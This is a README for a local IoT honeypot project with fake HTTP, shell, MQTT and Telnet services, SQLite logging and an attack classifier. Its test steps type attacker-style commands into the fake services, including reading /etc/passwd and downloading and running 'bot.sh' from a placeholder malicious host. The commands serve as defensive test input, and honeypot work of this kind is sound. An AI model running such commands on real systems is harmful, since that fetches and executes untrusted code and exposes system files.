# Adaptive IoT Honeypot Starter

A safe local starter project for an **Adaptive IoT Honeypot with Behavior Logging and Attack Classification**.

This starter includes:

- Fake IoT HTTP admin panel
- Fake IoT shell listener on port `2222`
- Fake MQTT listener on port `1883`
- Fake Telnet listener on port `23`
- SQLite logging
- Rule-based and optional ML attack classifier
- Simple dashboard/API using Flask with charts
- JSON and CSV event export
- Safe local testing commands

> Important: This starter is for controlled lab/demo use. Do not expose it directly to the public internet.

---

## 1. Setup

```bash
cd adaptive-iot-honeypot-starter

python3 -m venv .venv
source .venv/bin/activate

pip install -r requirements.txt
```

---

## 2. Run the honeypot

```bash
python app/main.py
```

It will start:

| Service | URL / Port |
|---|---|
| Dashboard | http://127.0.0.1:5000 |
| Fake HTTP IoT Admin Panel | http://127.0.0.1:8080 |
| Fake IoT Shell | 127.0.0.1:2222 |
| Fake MQTT | 127.0.0.1:1883 |
| Fake Telnet | 127.0.0.1:23 |

---

## 3. Test fake HTTP attack

Open:

```text
http://127.0.0.1:8080/admin
http://127.0.0.1:8080/login
```

Try posting login data:

```bash
curl -X POST http://127.0.0.1:8080/login \
  -d "username=admin&password=admin123"
```

---

## 4. Test fake shell attack

Use `nc`:

```bash
nc 127.0.0.1 2222
```

Then type commands:

```bash
whoami
uname -a
cat /etc/passwd
wget http://malicious-site/bot.sh
chmod +x bot.sh
./bot.sh
exit
```

---

## 5. View dashboard

Open:

```text
http://127.0.0.1:5000
```

API endpoint:

```text
http://127.0.0.1:5000/api/events
```

Export endpoints:

```text
http://127.0.0.1:5000/api/export?format=json
http://127.0.0.1:5000/api/export?format=csv
```

---

## 6. Test fake MQTT probe

Send a raw MQTT CONNECT packet:

```bash
printf '\x10\x0e\x00\x04MQTT\x04\x02\x00\x3c\x00\x00' | nc 127.0.0.1 1883
```

Send a raw MQTT SUBSCRIBE packet:

```bash
printf '\x82\x0c\x00\x01\x00\x07sensors\x00' | nc 127.0.0.1 1883
```

---

## 7. Test fake Telnet attack

Use `telnet`:

```bash
telnet 127.0.0.1 23
```

Then type commands:

```bash
whoami
uname -a
wget http://malicious-site/bot.sh
exit
```

---

## Project structure

```text
adaptive-iot-honeypot-starter/
├── app/
│   ├── main.py
│   ├── database.py
│   └── config.py
├── services/
│   ├── fake_http.py
│   ├── fake_mqtt.py
│   ├── fake_shell.py
│   └── fake_telnet.py
├── analyzer/
│   └── classifier.py
├── data/
│   └── honeypot.db
├── logs/
├── requirements.txt
└── README.md
```

---

## Next improvements

1. Add Docker support.
2. Add PDF reports.
3. Add STIX-style threat intelligence output.
4. Add stronger MQTT protocol parsing.
5. Add authentication/session tracking across services.
